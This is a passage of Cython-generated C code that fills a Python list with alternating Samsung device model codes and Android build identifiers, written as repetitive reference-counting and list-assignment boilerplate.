  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 53, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T311);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T311);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 54, __pyx_kp_s_SM_T311)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 55, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T531);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 56, __pyx_kp_s_SM_T531)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 57, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 58, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 59, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 60, __pyx_kp_s_SM_J320FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 61, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 62, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 63, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5210);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5210);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 64, __pyx_kp_s_GT_P5210)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 65, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T230);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T230);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 66, __pyx_kp_s_SM_T230)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 67, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 68, __pyx_kp_s_GT_I9192)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 69, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T235);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T235);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 70, __pyx_kp_s_SM_T235)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT4);
  __Pyx_GIVEREF(__pyx_n_s_KOT4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 71, __pyx_n_s_KOT4)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 72, __pyx_kp_s_GT_N7100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 73, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 74, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 75, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 76, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 77, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 78, __pyx_kp_s_GT_N7100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 79, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 80, __pyx_kp_s_SM_G920F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29K);
  __Pyx_GIVEREF(__pyx_n_s_MMB29K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 81, __pyx_n_s_MMB29K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 82, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF26X);
  __Pyx_GIVEREF(__pyx_n_s_NMF26X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 83, __pyx_n_s_NMF26X)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 84, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 85, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 86, __pyx_kp_s_SM_J320FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 87, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 88, __pyx_kp_s_SM_J320FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 89, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 90, __pyx_kp_s_SM_A500H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 91, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 92, __pyx_kp_s_GT_I9300)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JSS15J);
  __Pyx_GIVEREF(__pyx_n_s_JSS15J);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 93, __pyx_n_s_JSS15J)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 94, __pyx_kp_s_GT_I9500)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22C);
  __Pyx_GIVEREF(__pyx_n_s_LRX22C);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 95, __pyx_n_s_LRX22C)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 96, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY4);
  __Pyx_GIVEREF(__pyx_n_s_LMY4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 97, __pyx_n_s_LMY4)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 98, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF26X);
  __Pyx_GIVEREF(__pyx_n_s_NMF26X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 99, __pyx_n_s_NMF26X)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 100, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 101, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 102, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 103, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T561);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T561);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 104, __pyx_kp_s_SM_T561)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KTU84P);
  __Pyx_GIVEREF(__pyx_n_s_KTU84P);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 105, __pyx_n_s_KTU84P)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G900F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G900F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 106, __pyx_kp_s_SM_G900F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 107, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_S7390);
  __Pyx_GIVEREF(__pyx_kp_s_GT_S7390);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 108, __pyx_kp_s_GT_S7390)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 109, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 110, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 111, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 112, __pyx_kp_s_GT_P5100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JZO54K);
  __Pyx_GIVEREF(__pyx_n_s_JZO54K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 113, __pyx_n_s_JZO54K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500FU);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500FU);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 114, __pyx_kp_s_SM_A500FU)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 115, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G930F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G930F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 116, __pyx_kp_s_SM_G930F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 117, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 118, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF26X);
  __Pyx_GIVEREF(__pyx_n_s_NMF26X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 119, __pyx_n_s_NMF26X)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T561);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T561);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 120, __pyx_kp_s_SM_T561)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KTU84P);
  __Pyx_GIVEREF(__pyx_n_s_KTU84P);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 121, __pyx_n_s_KTU84P)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 122, __pyx_kp_s_GT_N8000)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 123, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T531);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 124, __pyx_kp_s_SM_T531)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 125, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 126, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 127, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 128, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NMF26X);
  __Pyx_GIVEREF(__pyx_n_s_NMF26X);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 129, __pyx_n_s_NMF26X)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 130, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 131, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5110);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5110);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 132, __pyx_kp_s_GT_P5110)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JDQ39);
  __Pyx_GIVEREF(__pyx_n_s_JDQ39);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 133, __pyx_n_s_JDQ39)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9301I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9301I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 134, __pyx_kp_s_GT_I9301I)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 135, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 136, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 137, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G930F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G930F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 138, __pyx_kp_s_SM_G930F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 139, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T311);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T311);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 140, __pyx_kp_s_SM_T311)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT4);
  __Pyx_GIVEREF(__pyx_n_s_KOT4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 141, __pyx_n_s_KOT4)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5200);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5200);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 142, __pyx_kp_s_GT_P5200)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 143, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9301I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9301I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 144, __pyx_kp_s_GT_I9301I)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 145, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 146, __pyx_kp_s_SM_J320M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 147, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T531);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 148, __pyx_kp_s_SM_T531)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 149, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T820);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T820);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 150, __pyx_kp_s_SM_T820)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_NRD90M);
  __Pyx_GIVEREF(__pyx_n_s_NRD90M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 151, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 152, __pyx_kp_s_GT_I9192)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 153, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_G935F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G935F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 154, __pyx_kp_s_SM_G935F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29K);
  __Pyx_GIVEREF(__pyx_n_s_MMB29K);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 155, __pyx_n_s_MMB29K)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J701F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J701F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 156, __pyx_kp_s_SM_J701F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_NRD90M_2);
  __Pyx_GIVEREF(__pyx_kp_s_NRD90M_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 157, __pyx_kp_s_NRD90M_2)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9301I);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9301I);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 158, __pyx_kp_s_GT_I9301I)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT4);
  __Pyx_GIVEREF(__pyx_n_s_KOT4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 159, __pyx_n_s_KOT4)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 160, __pyx_kp_s_SM_J320FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 161, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T111);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T111);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 162, __pyx_kp_s_SM_T111)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JDQ39);
  __Pyx_GIVEREF(__pyx_n_s_JDQ39);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 163, __pyx_n_s_JDQ39)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
